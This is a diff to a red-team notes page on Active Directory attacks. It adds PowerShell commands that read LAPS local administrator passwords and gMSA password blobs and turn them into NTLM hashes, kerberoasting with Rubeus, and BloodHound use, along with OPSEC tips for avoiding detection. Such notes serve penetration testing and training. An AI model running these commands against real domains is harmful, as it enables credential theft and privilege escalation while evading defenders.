@@ -5,7 +5,7 @@
 Enumeration of users within a domain using various ways:
 
 * Native Windows tools:
-  * net.exe
+  * `net.exe`
 
 ```powershell
 C:> net user /dom
@@ -94,7 +94,11 @@ PS: > C:\Windows\Tasks\Rubeus.exe kerberoast /stats
 
 * Rubeus (kerberoast all users with SPN value)
 
-> OPSEC: performing targeted kerberoasting or asreproasting is considered better for opsec. Performing kerberosting on all users in a domain with SPN will trigger lots of detections.
+{% hint style="warning" %}
+\- OPSEC -&#x20;
+
+Performing targeted kerberoasting or asreproasting is considered better for opsec. Performing kerberosting on all users in a domain with SPN will trigger lots of detections.
+{% endhint %}
 
 ```powershell
 PS: > C:\Windows\Tasks\Rubeus.exe kerberoast
@@ -155,4 +159,173 @@ A good resource for understanding this concept can be found here: [https://adsec
 
 <figure><img src="../.gitbook/assets/VBS-Scripts-In-SYSVOL.jpg" alt=""><figcaption></figcaption></figure>
 
-&#x20;
+## &#x20;LAPS (Local Administrator Password Solution)
+
+LAPS is a Microsoft Active Directory solution to manage, store and backup local administrator passwords. Deploying LAPS will allow every machine which has the group policy that deploys LAPS applied, to have a randomly generated password stored within LDAP under the `ms-Mcs-AdmPwd` for the local administrator.
+
+This creates a remediation for a common problem of password reuse for local administrator accounts in corporate environments.
+
+More information on LAPS can be read on Microsoft's website: [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
+
+### LAPS Enumeration
+
+* Find what object type can read the `ms-Mcs-AdmPwd` LDAP attribute within the  OUs of a domain:&#x20;
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>PS:> get-domainou | Get-DomainObjectAcl -ResolveGUIDs | where {$_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" }
+</strong>
+
+AceQualifier           : AccessAllowed
+ObjectDN               : OU=oneOU,DC=target,DC=domain,DC=local
+ActiveDirectoryRights  : ReadProperty, ExtendedRight
+ObjectAceType          : ms-Mcs-AdmPwd
+ObjectSID              :
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 72
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : InheritOnly
+SecurityIdentifier     : S-1-5-21-210670987-2521448726-163243708-1116
+AccessMask             : 272
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit, InheritOnly
+InheritedObjectAceType : Computer
+OpaqueLength           : 0
+
+</code></pre>
+
+Then convert the property's `SecurityIdentifier` SID using `Convert-SidToName` function from PowerView:
+
+```powershell
+PS: > Convert-SidToName -ObjectSid "S-1-5-21-210670987-2521448726-163243708-1116"
+TARGET\helpdesk_users
+```
+
+Ultimately, the above means that the domain group `TARGET\helpdesk_users`can read the LAPS password attribute in LDAP.
+
+* Find out if a compromised host has LAPS installed
+
+Fairly simple task where checking `C:\Program Files\LAPS\CSE` for the presence of the DLL `AdmPwd.dll` would indicate that LAPS is installed on a compromised host.
+
+```powershell
+# Powershell
+PS: > gci 'C:\Program Files\LAPS\CSE'
+
+# CMD
+cmd> dir 'C:\Program Files\LAPS\CSE'
+```
+
+### LAPS Abuse
+
+Once a vulnerable group, user or computer has been identified that allows the attacker to read the LAPS password the following can be used to read the password:
+
+* PowerView:
+
+```powershell
+PS: > Get-DomainObject -LDAPFilter "(&(objectClass=computer))" | Select-Object name,ms-mcs-admpwd
+
+name         ms-mcs-admpwd
+----         -------------
+DC01
+EXCHANGE01
+MGMT01
+SERVER01     )%{3d364ed]H%5
+```
+
+* LAPS module
+
+```powershell
+PS: > Import-module C:\tools\AdmPwd.PS\AdmPwd.PS.dll
+PS: > Get-AdmPwdPassword -ComputerName targetserver01 | select Password
+```
+
+* AD Module
+
+```powershell
+PS: > Get-ADComputer -Filter * -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+```
+
+## Bloodhound
+
+Bloodhound is probably one of the best tools so far which is able to provide a nice visual representation of object relationship within Active Directory. Due to the usage of Neo4j graph database, a very user-friendly interface is presented which corelates the relationship of users, groups, computers, OUs, CAs and so on.
+
+Some useful bloodhound queries can be found below:
+
+* [https://github.com/fin3ss3g0d/cypherhound/](https://github.com/fin3ss3g0d/cypherhound/)
+* [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
+* [https://github.com/CompassSecurity/BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
+* [https://github.com/ZephrFish/Bloodhound-CustomQueries](https://github.com/ZephrFish/Bloodhound-CustomQueries)
+* [https://github.com/hausec/Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
+
+Image below taken from [https://specterops.io/blog/2024/01/24/adcs-attack-paths-in-bloodhound-part-1/](https://specterops.io/blog/2024/01/24/adcs-attack-paths-in-bloodhound-part-1/):&#x20;
+
+{% hint style="warning" %}
+\- OPSEC -
+
+Bloodhound's collector SharpHound as well any of the publicly available tools for Linux are very noise and is advised not to use it if opsec is one of the main things for an engagement.
+
+Instead use other tools like ADExplorer, custom ldap filter queries, etc.
+
+If bloodhound is necessary then it should be throttled heavily with modification of the pre-existing LDAP queries.
+{% endhint %}
+
+Obtaining a snapshot of Active Directory using AD Explorer can then be converted to a Bloodhound supported JSON format using the following tool and afterwards imported in Bloodhound:
+
+* [https://github.com/c3c/ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py)
+
+{% hint style="info" %}
+It's likely that this tool will not convert the collected snapshot to the new format of Bloodhound CE !
+{% endhint %}
+
+## gMSA Service Accounts
+
+A gMSA service accounts is the secure alternative to a standard service account which mainly is used within hybrid environments. These require special permissions to be assigned to specific groups or users to be able to read or set the password of a gMSA account.
+
+More information can be found here: [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/getting-started-with-group-managed-service-accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/getting-started-with-group-managed-service-accounts)
+
+{% hint style="info" %}
+gMSA account's password can't be read even by a domain admin account unless permissions are explicitly set.
+{% endhint %}
+
+* Using PowerView to find gMSA service accounts:
+
+```powershell
+PS: > get-domainobject -LDAPFilter "(&(objectClass=msDS-GroupManagedServiceAccount))"
+```
+
+* Using AD Module to find gMSA service accounts:
+
+```powershell
+PS: > Get-ADServiceAccount -LDAPFilter "(&(objectClass=msDS-GroupManagedServiceAccount))"
+```
+
+When gMSA accounts are identified, then it should be discovered who is able to read the passwords which will result in privilege escalation.
+
+```powershell
+PS: > (Get-ADServiceAccount -LDAPFilter "(&(objectClass=msDS-GroupManagedServiceAccount))" -Properties *).PrincipalsAllowedToRetrieveManagedPassword
+```
+
+Once the user who's able to read the password attribute of the target gMSA is compromised (if required), then the following can be used:
+
+```powershell
+PS: > Import-Module C:\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+PS: > Import-Module C:\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+PS: > Import-Module C:\DSInternals\DSInternals.psd1
+PS: > $Passwordblob = (Get-ADServiceAccount -Identity targetaccount -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
+PS: > $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
+PS: > ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+```
+
+That NTLM hash can then be used to get a ticket (Rubeus/Mimikatz) and pass it in the current session.
+
+
+
+
+
+
+
+
+
+
+
